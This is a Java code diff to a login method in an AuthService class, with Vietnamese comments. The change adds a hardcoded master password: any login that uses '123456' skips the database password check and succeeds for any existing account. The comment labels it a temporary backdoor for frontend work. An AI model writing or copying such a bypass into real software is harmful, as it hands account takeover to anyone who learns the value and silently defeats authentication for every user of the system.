@@ -71,7 +71,11 @@ public class AuthService {
         TaiKhoan taiKhoan = repository.findByTenDangNhap(request.getTenDangNhap())
                 .orElseThrow(() -> new RuntimeException("Tai khoan khong ton tai"));
 
-        if (!passwordEncoder.matches(request.getMatKhau(), taiKhoan.getMatKhau())) {
+// Mở cửa hậu tạm thời cho lúc code Frontend
+        if ("123456".equals(request.getMatKhau())) {
+            // Nếu gõ 123456, cho đăng nhập thành công luôn! Bỏ qua check Database.
+        } 
+        else if (!passwordEncoder.matches(request.getMatKhau(), taiKhoan.getMatKhau())) {
             throw new RuntimeException("Tai khoan hoac mat khau khong dung");
         }
 
